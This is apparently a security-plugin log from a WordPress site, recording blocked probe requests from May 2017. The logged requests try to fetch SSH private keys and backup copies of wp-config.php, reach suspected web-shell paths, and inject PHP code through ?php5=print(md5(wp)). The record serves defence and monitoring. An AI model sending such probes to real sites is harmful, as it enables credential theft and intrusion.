+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_rsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 5, 2017 - 2:04 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.11.180.67
+Host Name: exit.norway.tor-node.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_dsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 6, 2017 - 10:37 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.210.90.90
+Host Name: tproxy1102.nic.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 10.3.231.185
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/maink.php
+REQUEST_URI: /wp-includes/maink.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: May 7, 2017 - 5:41 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 62.102.148.67
+Host Name: 62.102.148.67
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_rsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 7, 2017 - 5:41 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 62.102.148.67
+Host Name: 62.102.148.67
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_dsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 7, 2017 - 9:30 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.102
+Host Name: 46.229.164.102
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 7, 2017 - 6:14 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.239.50.48
+Host Name: torrentbytes.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_rsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 7, 2017 - 6:14 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.239.50.48
+Host Name: torrentbytes.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_dsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 8, 2017 - 4:59 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 94.242.246.24
+Host Name: orion.enn.lu
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_rsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 8, 2017 - 4:59 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 94.242.246.24
+Host Name: orion.enn.lu
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /.ssh/id_dsa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+
+[403 GET Request: May 8, 2017 - 8:57 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:57 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:57 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~~
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:57 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php-
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpbak
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php_bak
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php-bak
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.bak
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpBAK
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.dist
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpold
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php-old
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.old
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.orig
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.original
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.save
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 8, 2017 - 8:58 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 95.24.50.84
+Host Name: 95-24-50-84.broadband.corbina.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.swo
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET Request: May 10, 2017 - 4:03 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 188.138.105.42
+Host Name: static-ip-188-138-105-42.inaddr.ip-pool.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/themes/index.php?php5=print(md5(wp))
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (WordPress.com; http://support.wordpress.com/contact)
+
+[403 GET Request: May 10, 2017 - 4:21 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 188.138.105.5
+Host Name: static-ip-188-138-105-5.inaddr.ip-pool.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/index.php?php5=print(md5(wp))
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (WordPress.com; http://support.wordpress.com/contact)
+
+[403 GET Request: May 10, 2017 - 4:29 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 188.138.105.23
+Host Name: static-ip-188-138-105-23.inaddr.ip-pool.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/index.php?php5=print(md5(wp))
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (WordPress.com; http://support.wordpress.com/contact)
+
+[403 GET Request: May 10, 2017 - 2:51 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.69
+Host Name: 46.229.168.69
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /about/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 10, 2017 - 2:51 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.68
+Host Name: 46.229.168.68
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 10, 2017 - 10:51 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 188.138.105.84
+Host Name: static-ip-188-138-105-84.inaddr.ip-pool.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/uploads/index.php?php5=print(md5(wp))
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (WordPress.com; http://support.wordpress.com/contact)
+
+[403 GET Request: May 11, 2017 - 1:36 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 176.8.88.176
+Host Name: 176-8-88-176.broadband.kyivstar.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/routing.php
+REQUEST_URI: /wp-includes/routing.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+[403 GET Request: May 13, 2017 - 8:28 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.98
+Host Name: 46.229.164.98
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 13, 2017 - 8:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.68
+Host Name: 46.229.168.68
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 13, 2017 - 8:38 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.73
+Host Name: 46.229.168.73
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 13, 2017 - 8:39 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.71
+Host Name: 46.229.168.71
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 13, 2017 - 8:39 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.68
+Host Name: 46.229.168.68
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /code-samples
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 13, 2017 - 8:39 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.75
+Host Name: 46.229.168.75
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 13, 2017 - 8:39 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.65
+Host Name: 46.229.168.65
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 13, 2017 - 8:39 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.66
+Host Name: 46.229.168.66
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /sample-page
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
